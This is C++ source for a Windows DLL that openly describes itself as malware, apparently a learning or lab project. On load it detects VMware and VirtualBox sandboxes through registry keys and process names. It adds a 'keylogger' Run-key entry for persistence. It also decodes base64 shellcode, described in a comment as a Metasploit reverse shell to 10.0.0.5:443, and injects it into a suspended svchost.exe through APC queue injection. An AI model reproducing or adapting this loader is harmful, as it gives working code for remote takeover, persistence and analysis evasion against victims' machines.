// +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
//                                                                                  imports
// +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++


#include <iostream>
#include <string>
#include <vector>
#include <fstream>
#include <Windows.h>                                                                        // Windows API stuff
#include <iostream>
#include <sstream>
#include <cstring>
#include <tlhelp32.h>                                                                   // For checking running processes
#include <tchar.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>                                                                       

// +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
//                                                                                  Functions
// +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++


bool IsAnyProcessRunning(const std::vector<const TCHAR*>& processNames) {
    HANDLE hPrcsSBsnap;
    PROCESSENTRY32 pe32a;

    hPrcsSBsnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    pe32a.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hPrcsSBsnap, &pe32a)) {
        do {
            for (const auto& processName : processNames) {
                if (_tcscmp(pe32a.szExeFile, processName) == 0) {
                    CloseHandle(hPrcsSBsnap);
                    return true;
                }
            }
        } while (Process32Next(hPrcsSBsnap, &pe32a));
    }
    CloseHandle(hPrcsSBsnap);
    return false;
}

int FindTarget(const char *procname) {
    PROCESSENTRY32 pe32;
    HANDLE hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    pe32.dwSize = sizeof(PROCESSENTRY32); 

    int pid = 0;
    if (!Process32First(hProcSnap, &pe32)) {
        CloseHandle(hProcSnap);
        return 0;
    }

    while (Process32Next(hProcSnap, &pe32)) {
        if (lstrcmpiA(procname, pe32.szExeFile) == 0){
            pid = pe32.th32ProcessID;
            break;
        }
    }
    CloseHandle(hProcSnap);
    return pid;
}

std::string base64_chars = 
             "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
             "abcdefghijklmnopqrstuvwxyz"
             "0123456789+/";

inline bool is_base64(unsigned char c) {
  return (isalnum(c) || (c == '+') || (c == '/'));
}

std::string base64_decode(const std::string &encoded_string) {
  size_t in_len = encoded_string.size();
  size_t i = 0;
  size_t j = 0;
  int in_ = 0;
  unsigned char char_array_4[4], char_array_3[3];
  std::string ret;

  while (in_len-- && (encoded_string[in_] != '=') && is_base64(encoded_string[in_])) {
    char_array_4[i++] = encoded_string[in_]; in_++;
    if (i ==4) {
      for (i = 0; i <4; i++)
        char_array_4[i] = base64_chars.find(char_array_4[i]);

      char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
      char_array_3[1] = ((char_array_4[1] & 0x0F) << 4) + ((char_array_4[2] & 0x3C) >> 2);
      char_array_3[2] = ((char_array_4[2] & 0x03) << 6) + char_array_4[3];

      for (i = 0; (i < 3); i++)
        ret += char_array_3[i];
      i = 0;
    }
  }

  if (i) {
    for (j = i; j <4; j++)
      char_array_4[j] = 0;

    for (j = 0; j <4; j++)
      char_array_4[j] = base64_chars.find(char_array_4[j]);

    char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
    char_array_3[1] = ((char_array_4[1] & 0x0F) << 4) + ((char_array_4[2] & 0x3C) >> 2);

    for (j = 0; (j < i - 1); j++) ret += char_array_3[j];
  }

  return ret;
}



// ------------------------------------------------------------------------------- DLL entrypoint ------------------------------------------------------------------------------------------------


BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH:{
            int var = 1;                                                            // This greatly controls the behaviour of the malware

// +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
//                                                                             Anti-sandbox techniques
// +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

/* Check for registry keys */
            HKEY hkey1 = NULL;
            HKEY hkey2 = NULL;
            long chkEx1 = RegOpenKeyEx(HKEY_LOCAL_MACHINE, (LPCSTR)"SOFTWARE\\Vmware Inc.\\Vmware Tools", 0, KEY_READ, &hkey1);
            long chkEx2 = RegOpenKeyEx(HKEY_LOCAL_MACHINE, (LPCSTR)"HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 2\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0\\Identifier", 0, KEY_READ, &hkey2);
            if (chkEx1 == ERROR_SUCCESS || chkEx2 == ERROR_SUCCESS){
                MessageBox(NULL, "Sandbox detected", "Alert", MB_ABORTRETRYIGNORE | MB_DEFBUTTON1);
                var = 2;
                ExitProcess(0);
            }

/* Check for some specific running processes */
            
            std::vector<const TCHAR*> processNames = { _T("Vmtoolsd.exe"), _T("Vmwaretrat.exe"), _T("Vmwareuser.exe"), _T("Vmacthlp.exe"), _T("vboxservice.exe"), _T("vboxtray.exe") };

            if (IsAnyProcessRunning(processNames)) {
                var = 2;
                ExitProcess(0);
            }

// +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
//                                                                           Service Injection (Registry keys)
// +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

            MessageBox(NULL,"Hello, you're being hacked", "Success", MB_OK | MB_ICONQUESTION);
            
            if (var == 0){          
                MessageBox(NULL,"Malware Loaded", "Success", MB_OK);
                system("python decrypt.py");                                                             // if val = 0, launch this executable into a process or a registry key
                system("g++ -o test.exe decoded_output.cpp");
                system("del -Recurse -Force decoded_output.cpp");

                HKEY hkey = NULL;
                const char* exe = "C:\\Users\\<username>\\path\\to\\test.exe";
                long res = RegOpenKeyEx(HKEY_CURRENT_USER, (LPCSTR)"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hkey);
                if (res == ERROR_SUCCESS){
                    RegSetValueEx(hkey, (LPCSTR)"keylogger", 0, REG_SZ, (unsigned char*)exe, strlen(exe));
                    RegCloseKey(hkey);
                }
            }

// +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
//                                                                                      Process Injection       
// +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
            
            if (var == 1){

                std::string encoded_string = "XHg0OFx4MzFceGM5XHg0OFx4ODFceGU5XHhjNlx4ZmZceGZmXHhmZlx4NDhceDhkXHgwNVx4ZWZceGZmXHhmZlx4ZmZceDQ4XHhiYlx4NzRceDYyXHg5OVx4NGZceGIyXHg2NVx4NDJceDBlXHg0OFx4MzFceDU4XHgyN1x4NDhceDJkXHhmOFx4ZmZceGZmXHhmZlx4ZTJceGY0XHg4OFx4MmFceDFhXHhhYlx4NDJceDhkXHg4Mlx4MGVceDc0XHg2Mlx4ZDhceDFlXHhmM1x4MzVceDEwXHg1Zlx4MjJceDJhXHhhOFx4OWRceGQ3XHgyZFx4YzlceDVjXHgxNFx4MmFceDEyXHgxZFx4YWFceDJkXHhjOVx4NWNceDU0XHgyYVx4MTJceDNkXHhlMlx4MmRceDRkXHhiOVx4M2VceDI4XHhkNFx4N2VceDdiXHgyZFx4NzNceGNlXHhkOFx4NWVceGY4XHgzM1x4YjBceDQ5XHg2Mlx4NGZceGI1XHhhYlx4OTRceDBlXHhiM1x4YTRceGEwXHhlM1x4MjZceDIzXHhjOFx4MDdceDM5XHgzN1x4NjJceDg1XHgzNlx4NWVceGQxXHg0ZVx4NjJceGVlXHhjMlx4ODZceDc0XHg2Mlx4OTlceDA3XHgzN1x4YTVceDM2XHg2OVx4M2NceDYzXHg0OVx4MWZceDM5XHgyZFx4NWFceDRhXHhmZlx4MjJceGI5XHgwNlx4YjNceGI1XHhhMVx4NThceDNjXHg5ZFx4NTBceDBlXHgzOVx4NTFceGNhXHg0Nlx4NzVceGI0XHhkNFx4N2VceDdiXHgyZFx4NzNceGNlXHhkOFx4MjNceDU4XHg4Nlx4YmZceDI0XHg0M1x4Y2ZceDRjXHg4Mlx4ZWNceGJlXHhmZVx4NjZceDBlXHgyYVx4N2NceDI3XHhhMFx4OWVceGM3XHhiZFx4MWFceDRhXHhmZlx4MjJceGJkXHgwNlx4YjNceGI1XHgyNFx4NGZceGZmXHg2ZVx4ZDFceDBiXHgzOVx4MjVceDVlXHg0N1x4NzVceGIyXHhkOFx4YzRceGI2XHhlZFx4MGFceDBmXHhhNFx4MjNceGMxXHgwZVx4ZWFceDNiXHgxYlx4NTRceDM1XHgzYVx4ZDhceDE2XHhmM1x4M2ZceDBhXHg4ZFx4OThceDQyXHhkOFx4MWRceDRkXHg4NVx4MWFceDRmXHgyZFx4MzhceGQxXHhjNFx4YTBceDhjXHgxNVx4ZjFceDhiXHg5ZFx4YzRceDA2XHgwY1x4MTJceDMxXHgzY1x4MmJceDUxXHhhYlx4NGZceGIyXHgyNFx4MTRceDQ3XHhmZFx4ODRceGQxXHhjZVx4NWVceGM1XHg0M1x4MGVceDc0XHgyYlx4MTBceGFhXHhmYlx4ZDlceDQwXHgwZVx4NzVceGQ5XHhmZVx4ZDFceDk5XHg3N1x4MDNceDVhXHgzZFx4ZWJceDdkXHgwM1x4M2JceDk0XHgwM1x4YjRceDM4XHgxNVx4YmZceDQ4XHg0ZFx4YjBceDBlXHg4N1x4OWVceDBhXHg5OFx4NGVceGIyXHg2NVx4MWJceDRmXHhjZVx4NGJceDE5XHgyNFx4YjJceDlhXHg5N1x4NWVceDI0XHgyZlx4YThceDg2XHhmZlx4NTRceDgyXHg0Nlx4OGJceGEyXHhkMVx4YzZceDcwXHgyZFx4YmRceGNlXHgzY1x4ZWJceDU4XHgwZVx4MDhceDhmXHg0ZFx4ZDFceDk0XHg5ZFx4NGNceDA3XHgzYlx4YTJceDI4XHgxZVx4MzVceDNhXHhkNVx4YzZceDUwXHgyZFx4Y2JceGY3XHgzNVx4ZDhceDAwXHhlYVx4YzZceDA0XHhiZFx4ZGJceDNjXHhlM1x4NWRceDBmXHhiMFx4NjVceDQyXHg0N1x4Y2NceDAxXHhmNFx4MmJceGIyXHg2NVx4NDJceDBlXHg3NFx4MjNceGM5XHgwZVx4ZTJceDJkXHhjYlx4ZWNceDIzXHgzNVx4Y2VceDAyXHg4M1x4YTVceDI4XHgwM1x4MmRceDIzXHhjOVx4YWRceDRlXHgwM1x4ODVceDRhXHg1MFx4MzZceDk4XHg0ZVx4ZmFceGU4XHgwNlx4MmFceDZjXHhhNFx4OTlceDI3XHhmYVx4ZWNceGE0XHg1OFx4MjRceDIzXHhjOVx4MGVceGUyXHgyNFx4MTJceDQ3XHg4Ylx4YTJceGQ4XHgxZlx4ZmJceDlhXHg4YVx4NDNceGZkXHhhM1x4ZDVceGM2XHg3M1x4MjRceGY4XHg3N1x4YjhceDVkXHgxZlx4YjBceDY3XHgyZFx4NzNceGRjXHgzY1x4OWRceDUzXHhjNFx4YmNceDI0XHhmOFx4MDZceGYzXHg3Zlx4ZjlceGIwXHg2N1x4ZGVceGIyXHhiYlx4ZDZceDM0XHhkOFx4ZjVceDE0XHhmMFx4ZmZceDkzXHg4Ylx4YjdceGQxXHhjY1x4NzZceDRkXHg3ZVx4MDhceDA4XHg2OFx4MTlceGI0XHg1Mlx4MTBceDQ3XHhiNVx4MzNceDcxXHhlYlx4MjBceGQ4XHg2NVx4MWJceDRmXHhmZFx4YjhceDY2XHg5YVx4YjJceDY1XHg0Mlx4MGU="; 
                std::string decoded_string = base64_decode(encoded_string);

                unsigned char buf[decoded_string.length() + 1];
                strcpy( (char*) buf, decoded_string.c_str());
/*
Keep attacker and victim in different public networks. Make a different computer the attacker and this the victim. Then put the new target IP in this command generating a new payload. 
Put the payload here, start a new msfconsole session. Set the payload, lhost and lport, then run. Hope to catch the reverse shell. 

lhost = 10.0.0.5, lport = 443 --> for the reverse shell
test using this 'Hello World!' box --> "XHgzM1x4YzlceDY0XHg4Ylx4NDlceDMwXHg4Ylx4NDlceDBjXHg4Ylx4NDlceDFjXHg4Ylx4NTlceDA4XHg4Ylx4NDFceDIwXHg4Ylx4MDlceDgwXHg3OFx4MGNceDMzXHg3NVx4ZjJceDhiXHhlYlx4MDNceDZkXHgzY1x4OGJceDZkXHg3OFx4MDNceGViXHg4Ylx4NDVceDIwXHgwM1x4YzNceDMzXHhkMlx4OGJceDM0XHg5MFx4MDNceGYzXHg0Mlx4ODFceDNlXHg0N1x4NjVceDc0XHg1MFx4NzVceGYyXHg4MVx4N2VceDA0XHg3Mlx4NmZceDYzXHg0MVx4NzVceGU5XHg4Ylx4NzVceDI0XHgwM1x4ZjNceDY2XHg4Ylx4MTRceDU2XHg4Ylx4NzVceDFjXHgwM1x4ZjNceDhiXHg3NFx4OTZceGZjXHgwM1x4ZjNceDMzXHhmZlx4NTdceDY4XHg2MVx4NzJceDc5XHg0MVx4NjhceDRjXHg2OVx4NjJceDcyXHg2OFx4NGNceDZmXHg2MVx4NjRceDU0XHg1M1x4ZmZceGQ2XHgzM1x4YzlceDU3XHg2Nlx4YjlceDMzXHgzMlx4NTFceDY4XHg3NVx4NzNceDY1XHg3Mlx4NTRceGZmXHhkMFx4NTdceDY4XHg2Zlx4NzhceDQxXHgwMVx4ZmVceDRjXHgyNFx4MDNceDY4XHg2MVx4NjdceDY1XHg0Mlx4NjhceDRkXHg2NVx4NzNceDczXHg1NFx4NTBceGZmXHhkNlx4NTdceDY4XHg3Mlx4NmNceDY0XHgyMVx4NjhceDZmXHgyMFx4NTdceDZmXHg2OFx4NDhceDY1XHg2Y1x4NmNceDhiXHhjY1x4NTdceDU3XHg1MVx4NTdceGZmXHhkMFx4NTdceDY4XHg2NVx4NzNceDczXHgwMVx4ZmVceDRjXHgyNFx4MDNceDY4XHg1MFx4NzJceDZmXHg2M1x4NjhceDQ1XHg3OFx4NjlceDc0XHg1NFx4NTNceGZmXHhkNlx4NTdceGZmXHhkMA=="
*/

                SIZE_T payload_size = sizeof(buf);
                
                STARTUPINFOA startprocess = { 0 };                                                                               // give configuration and information about the newly create process 
                PROCESS_INFORMATION processinfo = { 0 };
                
                PVOID remotebuffer = 0;
                DWORD oldprotection = NULL;
                char newproc[] = "C:\\Windows\\System32\\svchost.exe";                                                           // Create a new process
                
                CreateProcessA(newproc, NULL, NULL, NULL, false, CREATE_SUSPENDED, NULL, NULL, &startprocess, &processinfo);
                
                HANDLE hprocess = processinfo.hProcess;
                HANDLE hthread = processinfo.hThread;
                
                remotebuffer = VirtualAllocEx(hprocess, NULL, payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);           // Allocate memory
                
                LPTHREAD_START_ROUTINE apcroutine = (LPTHREAD_START_ROUTINE)remotebuffer;

                WriteProcessMemory(hprocess, remotebuffer, buf, payload_size, NULL);                                             // Write Payload/shellcode into the remote buffer
                VirtualProtectEx(hprocess, remotebuffer, payload_size, PAGE_EXECUTE_READ, &oldprotection);                       // Changing Memory protection from RW -> RX
                
                QueueUserAPC((PAPCFUNC)apcroutine, hthread, NULL);                                                               // Queue it for APC
                
                ResumeThread(hthread);
            }

            break;
        }
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}
